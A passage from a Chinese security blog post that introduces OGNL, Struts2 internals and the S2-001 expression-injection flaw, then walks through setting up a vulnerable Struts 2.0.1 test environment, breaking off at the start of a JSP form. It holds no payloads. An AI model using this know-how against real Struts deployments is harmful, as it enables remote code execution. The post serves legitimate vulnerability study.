data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url">Java反序列化</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>Java反序列化</span></a></span></div></div><h1 class="post-title" itemprop="name headline">Java反序列化入门之S2-001分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-04-15T13:30:11.876Z" title="发表于 2024-04-15 21:30:11">2024-04-15</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-04-23T08:42:22.304Z" title="更新于 2024-04-23 16:42:22">2024-04-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">8.1k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>28分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="Java反序列化入门之S2-001分析"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/"><header><a class="post-meta-categories" href="/categories/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url">Java反序列化</a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" tabindex="-1" itemprop="url">Java反序列化</a><h1 id="CrawlerTitle" itemprop="name headline">Java反序列化入门之S2-001分析</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-04-15T13:30:11.876Z" title="发表于 2024-04-15 21:30:11">2024-04-15</time><time itemprop="dateCreated datePublished" datetime="2024-04-23T08:42:22.304Z" title="更新于 2024-04-23 16:42:22">2024-04-23</time></header><h1 id="0x01-前言">0x01 前言</h1>
<p>跟着师傅的指导，再来看看Structs2的漏（最近hvv也一直背的面经）。最近学习路上总是emo，发现自己以前学的不扎实，而且串联不起来，很混乱，目前还没找到解决的办法，只能说，先认真对待当下的每一次所学习的东西。日后在整理一下思绪。</p>
<h1 id="0x02-概述">0x02 概述</h1>
<p>自 Struts2 在 2007 年爆出第一个远程代码执行漏洞 S2-001 以来，在其后续的发展过程中不断爆出更多而且危害更大的远程代码执行漏洞，而造成 Struts2 这么多 RCE 漏洞的主要原因就是 OGNL 表达式。这里以 Struts2 的第一个漏洞 S2-001 为例来对 Struts2 远程代码执行漏洞进行学习</p>
<p>在这之前，也是简单过了一下Java se等基础，希望接下来分析能够顺利些</p>
<h1 id="0x03-前置知识">0x03 前置知识</h1>
<h2 id="ognl-简介">OGNL 简介</h2>
<p>首先来了解 OGNL 表达式，OGNL（Object Graphic Navigatino Language）的中文全称为“对象图导航语言”，是应用于Java中的一个开源的功能强大的表达式语言（Expression Language），它被集成在Struts2等框架中，通过简单一致的表达式语法，可以存取对象的任何属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。</p>
<p>OGNL进行对象存取操作的API在Ognl.java文件中，分别是getValue、setValue两个方法。getValue通过传入的OGNL表达式，在给定的上下文环境中，从root对象里取值：</p>
<p>创建一个Student类</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> {
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> String StudentNumber;
    <span class="hljs-keyword">private</span> TheClass theClass;

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getStudentNumber</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> StudentNumber;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setStudentNumber</span><span class="hljs-params">(String studentNumber)</span> {
        StudentNumber = studentNumber;
    }

    <span class="hljs-keyword">public</span> TheClass <span class="hljs-title function_">getTheClass</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> theClass;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTheClass</span><span class="hljs-params">(TheClass theClass)</span> {
        <span class="hljs-built_in">this</span>.theClass = theClass;
    }
}</code></pre>
<p>定义一个School类</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">School</span> {
    <span class="hljs-keyword">private</span> String schoolName;

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getSchoolName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> schoolName;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSchoolName</span><span class="hljs-params">(String schoolName)</span> {
        <span class="hljs-built_in">this</span>.schoolName = schoolName;
    }
}</code></pre>
<p>最后一个TheClass类</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TheClass</span> {
    <span class="hljs-keyword">private</span> String className;
    <span class="hljs-keyword">private</span> School school;

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getClassName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> className;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setClassName</span><span class="hljs-params">(String className)</span> {
        <span class="hljs-built_in">this</span>.className = className;
    }

    <span class="hljs-keyword">public</span> School <span class="hljs-title function_">getSchool</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> school;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSchool</span><span class="hljs-params">(School school)</span> {
        <span class="hljs-built_in">this</span>.school = school;
    }
}</code></pre>
<p>分别定义相应的属性，并设置get、set方法</p>
<p>之后添加ognl jar包作为相应的库，随后在定义一个TestOgnl类</p>
<pre><code class="hljs java"><span class="hljs-keyword">import</span> ognl.Ognl;
<span class="hljs-keyword">import</span> ognl.OgnlException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestOgnl</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> OgnlException {
        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();

        <span class="hljs-type">TheClass</span> <span class="hljs-variable">theClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TheClass</span>();

        <span class="hljs-type">School</span> <span class="hljs-variable">school</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">School</span>();
        school.setSchoolName(<span class="hljs-string">"一中"</span>);

        theClass.setSchool(school);
        theClass.setClassName(<span class="hljs-string">"三班"</span>);

        student.setName(<span class="hljs-string">"hybcx"</span>);
        student.setStudentNumber(<span class="hljs-string">"003"</span>);
        student.setTheClass(theClass);

        <span class="hljs-type">String</span> <span class="hljs-variable">schoolName</span> <span class="hljs-operator">=</span> (String) Ognl.getValue(<span class="hljs-string">"#root.theClass.school.schoolName"</span>, student);
        System.out.println(schoolName);
    }
}</code></pre>
<p>分别给对应的属性赋值，接着我们是想要获取到其中的schoolName属性值</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418095422742.png" alt="image-20240418095422742"></p>
<p>我们可以与传统的方法比较一下，如果想要获取schoolName属性值，就需要实例化对应类，然后调用get方法。但如果使用ognl的getValue方法，就只需要传递一个ognl表达式和根节点就能取出指定对象的属性值。</p>
<h2 id="ognl-三要素">OGNL 三要素</h2>
<p>OGNL具有三要素：表达式（expression）、根对象（root）和上下文对象（context）。</p>
<ul>
<li>表达式（expression）：表达式是整个OGNL的核心，通过表达式来告诉OGNL需要执行什么操作；</li>
<li>根对象（root）：root可以理解为OGNL的操作对象，OGNL可以对root进行取值或写值等操作，表达式规定了“做什么”，而根对象则规定了“对谁操作”。实际上根对象所在的环境就是 OGNL 的上下文对象环境；</li>
<li>上下文对象（context）：context可以理解为对象运行的上下文环境，context以MAP的结构、利用键值对关系来描述对象中的属性以及值；</li>
</ul>
<p>这样不难知道，OGNL的context是包含root的。</p>
<p>Struts2中的ActionContext即为OGNL的context（又称context map），其中包含的ValueStack即为OGNL的root。该ActionContext包含的对象如图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418101707352.png" alt="image-20240418101707352"></p>
<h2 id="valuestack">ValueStack</h2>
<p>值栈（ValueStack）就是OGNL表达式存取数据的地方。在一个值栈中，封装了一次请求所需要的所有数据。</p>
<p>在使用Struts2的项目中，Struts2会为每个请求创建一个新的值栈，也就是说，值栈和请求是一一对应的关系，这种一一对应的关系使值栈能够线程安全地为每个请求提供公共的数据存取服务。</p>
<h3 id="值栈的作用">值栈的作用</h3>
<p>值栈可以作为一个数据中转站在前台与后台之间传递数据，最常见的就是将Struts2的标签与OGNL表达式结合使用。值栈实际上是一个接口，在Struts2中利用OGNL时，实际上使用的就是实现了该接口的OgnlValueStack类，这个类是OGNL的基础。</p>
<p>值栈贯穿整个Action的生命周期，每个Action类的对象实例都拥有一个ValueStack对象，在ValueStack对象中保存了当前Action对象和其他相关对象。</p>
<p>要获取值栈中存储的数据，首先应该获取值栈。值栈的获取有两种方式，具体如下。</p>
<h4 id="request中获取值栈">request中获取值栈</h4>
<p>ValueStack对象在request范围内的存储方式为<code>request.setAttribute("struts.valueStack",valuestack)</code>，可以通过如下方式从request中取出值栈的信息。</p>
<pre><code class="hljs scss"><span class="hljs-comment">//获取 ValueStack 对象，通过 request 对象获取</span>
ValueStack valueStack = (ValueStack)ServletActionContext<span class="hljs-selector-class">.getRequest</span>()
            <span class="hljs-selector-class">.getAttribute</span>(ServletActionContext.STRUTS_VALUESTACK_KEY);</code></pre>
<p>在上述示例代码中，ServletActionContext.STRUTS_VALUESTACK_KEY是ServletActionContext类中的常量，它的值为struts.valueStack。</p>
<h4 id="actioncontext中获取值栈">ActionContext中获取值栈</h4>
<p>在使用Struts2框架时，可以使用OGNL操作Context对象从ValueStack中存取数据，也就是说，可以从Context对象中获取ValueStack对象。实际上，Struts2框架中的Context对象就是ActionContext。</p>
<p>ActionContext获取ValueStack对象的方式如下所示：</p>
<pre><code class="hljs scss"><span class="hljs-comment">//通过 ActionContext 获取 valueStack 对象</span>
ValueStack valueStack = ActionContext<span class="hljs-selector-class">.getContext</span>()<span class="hljs-selector-class">.getValueStack</span>();</code></pre>
<p>ActionContext对象是在StrutsPrepareAndExcuteFilter的doFilter()方法中被创建的，在源码中用于创建ActionContext对象的createActionContext()方法内可以找到获取的ValueStack对象的信息。</p>
<p>方法中还有这样一段代码：</p>
<pre><code class="hljs scss">ctx = new <span class="hljs-built_in">ActionContext</span>(stack.getContext());</code></pre>
<p>从上述代码中可以看出，ValueStack对象中的Context对象被作为参数传递给了ActionContext对象，这也就说明ActionContext对象中持有了ValueStack对象的引用，因此可以通过ActionContext对象获取ValueStack对象。</p>
<h2 id="struts2-执行流程">Struts2 执行流程</h2>
<p>首先来简单了解 Struts2 的执行流程。官方提供的 Struts2 的架构如图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418102511361.png" alt="image-20240418102511361"></p>
<p>在该图中，一共给出了四种颜色的标识，其对应的意义如下。</p>
<ul>
<li>Servlet Filters(橙色)：过滤器，所有的请求都要经过过滤器的处理。</li>
<li>Struts Core(浅蓝色)：Struts2的核心部分。</li>
<li>Interceptors(浅绿色)：Struts2的拦截器。</li>
<li>User created(浅黄色)：需要开发人员创建的部分。</li>
</ul>
<p>图中的一些组件的作用如下：</p>
<ul>
<li><strong>FilterDispatcher</strong>：是整个Struts2的调度中心，也就是整个MVC架构中的C，它根据ActionMapper的结果来决定是否处理请求。</li>
<li><strong>ActionMapper</strong>：用来判断传入的请求是否被Struts2处理，如果需要处理的话，ActionMapper就会返回一个对象来描述请求对应的ActionInvocation的信息。</li>
<li><strong>ActionProxy</strong>：用来创建一个ActionInvocation代理实例，它位于Action和xwork之间。</li>
<li><strong>ConfigurationManager</strong>：是xwork配置的管理中心，可以把它当做已经读取到内存中的<code>struts.xml</code>配置文件。</li>
<li><strong>struts.xml</strong>：是Stuts2的应用配置文件，负责诸如URL与Action之间映射的配置、以及执行后页面跳转的Result配置等。</li>
<li><strong>ActionInvocation</strong>：用来真正的调用并执行Action、拦截器和对应的Result，作用类似于一个调度器。</li>
<li><strong>Interceptor</strong>：拦截器，可以自动拦截Action，主要在Action运行之前或者Result运行之后来进行执行，开发者可以自定义。</li>
<li><strong>Action</strong>：是Struts2中的动作执行单元。用来处理用户请求，并封装业务所需要的数据。</li>
<li><strong>Result</strong>：是不同视图类型的抽象封装模型，不同的视图类型会对应不同的Result实现，Struts2中支持多种视图类型，比如Jsp，FreeMarker等。</li>
<li><strong>Templates</strong>：各种视图类型的页面模板，比如JSP就是一种模板页面技术。</li>
<li><strong>Tag Subsystem</strong>：Struts2的标签库，它抽象了三种不同的视图技术JSP、velocity、freemarker，可以在不同的视图技术中，几乎没有差别的使用这些标签。</li>
</ul>
<p>接下来我们可以结合上图，来了解下Struts2框架是如何处理一个HTTP请求的。</p>
<p>当HTTP请求发送到Web服务器之后，Web服务器根据用户的请求以及<code>web.xml</code>中的配置文件，将请求转发给<code>Struts2</code>框架进行处理。</p>
<ol>
<li>HTTP请求经过一系列的过滤器，最后到达<code>FilterDispatcher</code>过滤器。</li>
<li><code>FilterDispatcher</code>将请求转发给<code>ActionMapper</code>，判断该请求是否需要处理。</li>
<li>如果该请求需要处理，<code>FilterDispatcher</code>会创建一个<code>ActionProxy</code>来进行后续的处理。</li>
<li><code>ActionProxy</code>拿着HTTP请求，询问<code>struts.xml</code>该调用哪一个<code>Action</code>进行处理。</li>
<li>当知道目标<code>Action</code>之后，实例化一个<code>ActionInvocation</code>来进行调用。</li>
<li>然后运行在<code>Action</code>之前的拦截器，图中就是拦截器1、2、3。</li>
<li>运行<code>Action</code>，生成一个<code>Result</code>。</li>
<li><code>Result</code>根据页面模板和标签库，生成要响应的内容。</li>
<li>根据响应逆序调用拦截器，然后生成最终的响应并返回给Web服务器。</li>
</ol>
<h1 id="0x04-漏洞分析">0x04 漏洞分析</h1>
<p>官方公告：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-001">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p>
<p>漏洞影响范围：WebWork 2.2.0-WebWork 2.2.5，Struts 2.0.0-Struts 2.0.8</p>
<p>S2-001的漏洞原理是模板文件（JSP）中引用了不合适的标签进行渲染，并且渲染的值是用户可控的，此时则达成了表达式注入的目的。</p>
<h2 id="漏洞环境搭建">漏洞环境搭建</h2>
<p>Apache Tomcat/8.5.46+struts2（这个插件最新版）</p>
<p>首先在idea安装Struts2插件（官方说2023.2之后就不在支持该插件，这里我是2023.1版本）</p>
<p>这里在搭建环境也是遇到众多问题，因为现在的文章都是几年前的，idea也是老版本，对于我这个idea玩不明白的人，也是很费劲，搜了众多文章总算是解决了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418103413106.png" alt="image-20240418103413106"></p>
<p>首先如上图所示创建一个新项目即可，新版不能直接创建Java ee，接着创建好的项目，添加技术框架支持</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418103455122.png" alt="image-20240418103455122"></p>
<p>红色方框这里应该是有个web应用程序的（我这里已经添加过，因此不显示）接着选中Struts2，设置<strong>稍后设置库</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418103607692.png" alt="image-20240418103607692"></p>
<p>下载struts-2.0.1-all，在项目目录 WEB-INF 下新建 lib 文件夹，将所需要的jar包从下载目录中导入到 lib 文件夹下，将全部jar包选中，右键 Add as Library</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418103736435.png" alt="image-20240418103736435"></p>
<p>所需要的jar包如上图所示，下面的由于已经创建过，就借用个图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418103827899.png" alt="image-20240418103827899"></p>
<p>选中以上jar包，添加为库即可，名字任意。接着在项目结构的工件处，将该项目至于Output Root</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418103915661.png" alt="image-20240418103915661"></p>
<p>最后创建Tomcat server（版本在8左右即可），设置好之后，在部署那一栏添加相应的war（可能不够详细，之后会放参考文章）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418104040031.png" alt="image-20240418104040031"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418104055692.png" alt="image-20240418104055692"></p>
<p>最后点击右上角的启动即可，成功的话会直接跳转到相应url，但如果显示不成功，除了程序本身的配置问题。看一下是否是使用了https协议，这里我们默认是http，因此你需要修改为http协议</p>
<p>最后项目结构以及成功结果如下图所示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418104250522.png" alt="image-20240418104250522"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240418104307968.png" alt="image-20240418104307968"></p>
<p>因为漏洞是在表单验证失败时发生的，这里继续编写一个表单验证的Demo，以复现漏洞。 在 WEB 目录下修改 index.jsp</p>
<pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">"java"</span> contentType=<span class="hljs-string">"text/html; charset=UTF-8"</span>
         pageEncoding=<span class="hljs-string">"UTF-8"</span>%&gt;
&lt;%@ taglib prefix=<span class="hljs-string">"s"</span> uri=<span class="hljs-string">"/struts-tags"</span> %&gt;

&lt;!DOCTYPE html PUBLIC <span class="hljs-string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="hljs-string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;
&lt;html&gt;
&lt;head&gt;
